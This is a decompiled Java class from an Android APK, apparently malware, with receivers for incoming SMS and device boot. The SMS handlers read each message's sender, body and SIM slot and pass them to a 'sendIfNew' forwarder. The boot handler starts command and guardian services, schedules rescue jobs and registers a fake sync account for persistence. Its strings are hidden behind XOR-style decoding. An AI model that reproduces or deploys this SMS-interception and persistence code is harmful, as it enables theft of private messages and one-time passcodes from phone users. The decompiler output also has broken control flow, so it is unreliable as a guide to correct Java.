package com.base.template;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.impl.WorkManagerImpl;
import com.base.template.services.CommandService;
import com.base.template.services.GuardianService;
import com.base.template.services.RescueJobService;
import java.util.concurrent.TimeUnit;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.CharsKt;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class SmsReceiver$$ExternalSyntheticLambda0 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ Context f$0;
    public final /* synthetic */ Intent f$1;
    public final /* synthetic */ BroadcastReceiver.PendingResult f$3;

    public /* synthetic */ SmsReceiver$$ExternalSyntheticLambda0(Context context, Intent intent, BroadcastReceiver broadcastReceiver, BroadcastReceiver.PendingResult pendingResult, int i) {
        this.$r8$classId = i;
        this.f$0 = context;
        this.f$1 = intent;
        this.f$3 = pendingResult;
    }

    /* JADX WARN: Code duplicated, block: B:116:0x023e  */
    /* JADX WARN: Code duplicated, block: B:28:0x00af  */
    @Override // java.lang.Runnable
    public final void run() {
        boolean zAreEqual;
        int i;
        SubscriptionManager subscriptionManager;
        SubscriptionInfo activeSubscriptionInfo;
        int simSlotIndex;
        String string;
        SubscriptionInfo activeSubscriptionInfo2;
        int simSlotIndex2;
        String string2;
        int i2 = this.$r8$classId;
        String strDecode = C0000.decode(new byte[]{67, 3, 84, 87, 22, 90, 95, 95, 77, 111, 68, 19, 90, 65, 5, 64, 89, 65, 64, 89, 88, 8, 103, 65, 3, 64, 70, 88, 87, 85}, "7f82f20140");
        String strDecode2 = C0000.decode(new byte[]{18, 68, 3, 75, 84, 17, 8, 65, 21, 81, 88, 13}, "a1a87c");
        String strDecode3 = C0000.decode(new byte[]{80, 94, 68, 72}, "c948585c293227");
        String strDecode4 = C0000.decode(new byte[]{87, 93, 70, 9, 80, 18}, "124d1f7d4ade9b");
        String strDecode5 = C0000.decode(new byte[]{64, 82, 76, 22}, "069ead8b8d488a2b");
        int i3 = 0;
        switch (i2) {
            case 0:
                Context context = this.f$0;
                Intent intent = this.f$1;
                BroadcastReceiver.PendingResult pendingResult = this.f$3;
                int i4 = SmsReceiver.$r8$clinit;
                try {
                    try {
                        CommandService commandService = CommandService.instance;
                        Headers.Companion.safeStartService(context, C0000.decode(new byte[]{103, 116, 103, 109, 102, 35, 42, 117}, "49421ba06f5f109b"));
                        if (Intrinsics.areEqual(intent.getAction(), C0000.decode(new byte[]{4, 13, 81, 71, 87, 80, 84, 72, 21, 75, 14, 70, 8, 80, 93, 22, 75, 55, 80, 89, 93, 73, 88, 9, 11, 64, 79, 99, 44, 103, 103, 54, 32, 32, 112, 124, 110, 124, 116}, "ec55890fe9a0a48d"))) {
                            try {
                                zAreEqual = Intrinsics.areEqual(Telephony.Sms.getDefaultSmsPackage(context), context.getPackageName());
                            } catch (Exception unused) {
                                zAreEqual = false;
                            }
                            if (!zAreEqual) {
                                Bundle extras = intent.getExtras();
                                Object obj = extras != null ? extras.get(strDecode5) : null;
                                Object[] objArr = obj instanceof Object[] ? (Object[]) obj : null;
                                if (objArr != null) {
                                    Bundle extras2 = intent.getExtras();
                                    if (extras2 != null && (string = extras2.getString(strDecode4)) != null) {
                                        strDecode3 = string;
                                    }
                                    Bundle extras3 = intent.getExtras();
                                    i = extras3 != null ? extras3.getInt(strDecode2, -1) : -1;
                                    if (i < 0) {
                                        simSlotIndex = 0;
                                    } else {
                                        try {
                                            Object systemService = context.getSystemService(strDecode);
                                            subscriptionManager = systemService instanceof SubscriptionManager ? (SubscriptionManager) systemService : null;
                                            if (subscriptionManager == null || (activeSubscriptionInfo = subscriptionManager.getActiveSubscriptionInfo(i)) == null) {
                                                simSlotIndex = 0;
                                            } else {
                                                simSlotIndex = activeSubscriptionInfo.getSimSlotIndex();
                                            }
                                            break;
                                        } catch (Exception unused2) {
                                        }
                                    }
                                    StringBuilder sb = new StringBuilder();
                                    int length = objArr.length;
                                    String displayOriginatingAddress = "";
                                    while (i3 < length) {
                                        SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i3], strDecode3);
                                        if (smsMessageCreateFromPdu != null) {
                                            if (displayOriginatingAddress.length() == 0 && (displayOriginatingAddress = smsMessageCreateFromPdu.getDisplayOriginatingAddress()) == null) {
                                                displayOriginatingAddress = "";
                                            }
                                            String displayMessageBody = smsMessageCreateFromPdu.getDisplayMessageBody();
                                            if (displayMessageBody == null) {
                                                displayMessageBody = "";
                                            }
                                            sb.append(displayMessageBody);
                                        }
                                        i3++;
                                    }
                                    if (sb.length() > 0 && displayOriginatingAddress.length() > 0) {
                                        SmsDedup.INSTANCE.sendIfNew(context, displayOriginatingAddress, sb.toString(), simSlotIndex);
                                    }
                                    break;
                                }
                            }
                        }
                        break;
                    } catch (Exception unused3) {
                    }
                    return;
                } finally {
                    pendingResult.finish();
                }
            case 1:
                Intent intent2 = this.f$1;
                Context context2 = this.f$0;
                BroadcastReceiver.PendingResult pendingResult2 = this.f$3;
                int i5 = BootReceiver.$r8$clinit;
                try {
                    intent2.getAction();
                    CommandService commandService2 = CommandService.instance;
                    Headers.Companion.safeStartService(context2, C0000.decode(new byte[]{114, 45, 45, 98, 62, 55, 54, 120, 102, 53}, "0bb6adb94a2fa8c6"));
                    try {
                        int i6 = GuardianService.$r8$clinit;
                        CharsKt.start(context2);
                        break;
                    } catch (Exception unused4) {
                    }
                    try {
                        TimeUnit timeUnit = TimeUnit.MINUTES;
                        WorkManagerImpl.getInstance$1(context2).enqueueUniquePeriodicWork((PeriodicWorkRequest) new OneTimeWorkRequest.Builder().build());
                        break;
                    } catch (Exception e) {
                        try {
                            e.getMessage();
                            break;
                        } catch (Exception unused5) {
                        }
                    }
                    try {
                        RescueJobService.Companion.getClass();
                        RescueJobService.Companion.schedule(context2);
                        break;
                    } catch (Exception unused6) {
                    }
                    try {
                        String strDecode6 = C0000.decode(new byte[]{91, 89, 88, 22, 0, 89, 75, 83, 27, 76, 7, 85, 72, 90, 84, 76, 7, 22, 89, 85, 86, 87, 23, 86, 76}, "8658b8");
                        String strDecode7 = C0000.decode(new byte[]{82, 88, 12, 27, 83, 2, 75, 93, 26, 22, 7, 9, 19, 14, 83, 65, 84, 25, 17, 71, 94, 21, 81, 92, 81, 16}, "17a51c884bbdcb25");
                        try {
                            AccountManager accountManager = AccountManager.get(context2);
                            Account account = new Account(C0000.decode(new byte[]{50, 65, 70, 76, 4, 93}, "a858a09a193357bc"), strDecode6);
                            if (accountManager.getAccountsByType(strDecode6).length == 0) {
                                accountManager.addAccountExplicitly(account, null, null);
                            }
                            ContentResolver.setIsSyncable(account, strDecode7, 1);
                            ContentResolver.setSyncAutomatically(account, strDecode7, true);
                            ContentResolver.addPeriodicSync(account, strDecode7, Bundle.EMPTY, 1800L);
                        } catch (Exception e2) {
                            e2.getMessage();
                        }
                        break;
                    } catch (Exception unused7) {
                    }
                    try {
                        NativeBridge.onBoot();
                        break;
                    } catch (Exception unused8) {
                    }
                    return;
                } finally {
                    pendingResult2.finish();
                }
            default:
                Context context3 = this.f$0;
                Intent intent3 = this.f$1;
                BroadcastReceiver.PendingResult pendingResult3 = this.f$3;
                int i7 = SmsDeliverReceiver.$r8$clinit;
                try {
                    try {
                        CommandService commandService3 = CommandService.instance;
                        Headers.Companion.safeStartService(context3, C0000.decode(new byte[]{50, 126, 49, 108, 33, 36, 45, 122, 52, 118, 55, 62, 54, 114, 41, 118}, "a3b3ea"));
                        Bundle extras4 = intent3.getExtras();
                        Object obj2 = extras4 != null ? extras4.get(strDecode5) : null;
                        Object[] objArr2 = obj2 instanceof Object[] ? (Object[]) obj2 : null;
                        if (objArr2 != null) {
                            Bundle extras5 = intent3.getExtras();
                            if (extras5 != null && (string2 = extras5.getString(strDecode4)) != null) {
                                strDecode3 = string2;
                            }
                            Bundle extras6 = intent3.getExtras();
                            i = extras6 != null ? extras6.getInt(strDecode2, -1) : -1;
                            if (i < 0) {
                                simSlotIndex2 = 0;
                            } else {
                                try {
                                    Object systemService2 = context3.getSystemService(strDecode);
                                    subscriptionManager = systemService2 instanceof SubscriptionManager ? (SubscriptionManager) systemService2 : null;
                                    if (subscriptionManager == null || (activeSubscriptionInfo2 = subscriptionManager.getActiveSubscriptionInfo(i)) == null) {
                                        simSlotIndex2 = 0;
                                    } else {
                                        simSlotIndex2 = activeSubscriptionInfo2.getSimSlotIndex();
                                    }
                                    break;
                                } catch (Exception unused9) {
                                }
                            }
                            StringBuilder sb2 = new StringBuilder();
                            int length2 = objArr2.length;
                            String displayOriginatingAddress2 = "";
                            while (i3 < length2) {
                                SmsMessage smsMessageCreateFromPdu2 = SmsMessage.createFromPdu((byte[]) objArr2[i3], strDecode3);
                                if (smsMessageCreateFromPdu2 != null) {
                                    if (displayOriginatingAddress2.length() == 0 && (displayOriginatingAddress2 = smsMessageCreateFromPdu2.getDisplayOriginatingAddress()) == null) {
                                        displayOriginatingAddress2 = "";
                                    }
                                    String displayMessageBody2 = smsMessageCreateFromPdu2.getDisplayMessageBody();
                                    if (displayMessageBody2 == null) {
                                        displayMessageBody2 = "";
                                    }
                                    sb2.append(displayMessageBody2);
                                }
                                i3++;
                            }
                            if (sb2.length() > 0 && displayOriginatingAddress2.length() > 0) {
                                SmsDedup.INSTANCE.sendIfNew(context3, displayOriginatingAddress2, sb2.toString(), simSlotIndex2);
                            }
                        }
                        break;
                    } catch (Exception unused10) {
                    }
                    return;
                } finally {
                    pendingResult3.finish();
                }
        }
    }

    public /* synthetic */ SmsReceiver$$ExternalSyntheticLambda0(Intent intent, Context context, BroadcastReceiver.PendingResult pendingResult) {
        this.$r8$classId = 1;
        this.f$1 = intent;
        this.f$0 = context;
        this.f$3 = pendingResult;
    }
}
